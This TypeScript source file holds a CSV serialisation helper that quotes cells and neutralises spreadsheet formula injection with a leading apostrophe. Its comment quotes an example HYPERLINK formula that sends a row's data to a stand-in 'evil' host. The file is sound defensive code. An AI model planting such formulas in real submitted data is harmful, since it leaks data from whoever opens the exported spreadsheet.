// CSV serialisation, shared by the session export and the public share export.
//
// It lived in both routes verbatim. That was survivable while it was five lines
// of RFC-4180 quoting — it stopped being survivable the moment it grew a
// security rule, because "fix the one the reviewer looked at" is how the public
// route keeps the bug.
//
// Pure, no `server-only`, so it unit-tests.

/** Characters that make a spreadsheet treat a cell as a FORMULA. */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/** RFC 4180 quoting, plus formula-injection neutralisation.
 *
 *  ── Why the leading apostrophe ──
 *
 *  Record values are attacker-writable WITHOUT a credential: anyone can submit a
 *  public form. Excel, Sheets and LibreOffice all treat a cell beginning `=`,
 *  `+`, `-`, `@` (or a lone tab/CR) as a formula, so
 *  `=HYPERLINK("http://evil/?"&A1,"Click")` in a submitted name exfiltrates the
 *  row the moment a colleague opens the export. Quoting alone does NOT stop it —
 *  the parser strips quotes before evaluating.
 *
 *  A leading `'` is the standard neutraliser: spreadsheets read it as "the rest
 *  is literal text" and hide it. The character is prefixed rather than stripped
 *  so the value stays honest for any non-spreadsheet consumer. */
export function csvCell(value: unknown): string {
  if (value == null) return "";

  let s = Array.isArray(value) ? value.join(", ") : String(value);
  if (FORMULA_LEAD.test(s)) s = `'${s}`;

  if (!/[",\n\r]/.test(s)) return s;
  return `"${s.replace(/"/g, '""')}"`;
}

export function csvRow(cells: unknown[]): string {
  return cells.map(csvCell).join(",") + "\r\n";
}
